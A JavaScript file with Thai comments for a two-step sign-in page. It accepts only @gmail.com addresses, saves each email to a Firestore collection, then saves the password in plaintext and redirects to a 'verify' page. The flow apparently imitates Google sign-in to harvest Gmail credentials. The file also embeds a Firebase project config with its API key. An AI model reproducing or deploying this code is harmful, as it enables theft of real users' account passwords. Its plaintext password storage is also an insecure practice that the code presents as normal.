// ✅ Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyCTgAP4Tvlri2-seayJIrC9dpwTA-avZA0",
    authDomain: "loginsystem-7f056.firebaseapp.com",
    projectId: "loginsystem-7f056",
    storageBucket: "loginsystem-7f056.appspot.com",
    messagingSenderId: "1094872135642",
    appId: "1:1094872135642:web:72419f77faf8537c36b2e3",
    measurementId: "G-NT11WXB1W3"
};

// ✅ ตรวจสอบว่า Firebase ถูกโหลดก่อนใช้งาน
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();  // Firestore Database

console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
console.log("📂 Firestore Instance:", db);

// 📌 ตรวจสอบอีเมล และ ปิด/เปิดปุ่ม "ถัดไป"
function validateEmail() {
    let email = document.getElementById("email").value.trim();
    let nextButton = document.getElementById("next-btn");

    // ✅ ถ้าอีเมลลงท้ายด้วย @gmail.com ให้เปิดปุ่ม
    if (email.endsWith("@gmail.com")) {
        nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
    } else {
        nextButton.disabled = true; // 🔒 ปิดปุ่มถ้ายังไม่ถูกต้อง
    }
}

// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore และไปหน้ารหัสผ่าน
function saveEmail() {
    let email = document.getElementById("email").value.trim();

    // ❌ ถ้าไม่มี @gmail.com ไม่ให้ไปต่อ
    if (!email.endsWith("@gmail.com")) {
        return;
    }

    // ✅ บันทึกอีเมลลง Firestore
    db.collection("users").doc(email).set({
        email: email,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true })
    .then(() => {
        console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
        localStorage.setItem("userEmail", email);
        window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
    });
}

// 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
function savePassword() {
    let password = document.getElementById("password").value.trim();
    let email = localStorage.getItem("userEmail");

    console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);

    // ❌ ถ้าไม่มีอีเมล ให้กลับไปหน้าแรก
    if (!email) {
        window.location.href = "index.html"; 
        return;
    }

    // ❌ ถ้าไม่ใส่รหัสผ่าน ไม่ให้ไปต่อ
    if (!password) {
        return;
    }

    // ✅ บันทึกรหัสผ่านลง Firestore
    db.collection("users").doc(email).update({
        password: password
    })
    .then(() => {
        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยัน
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
    });
}
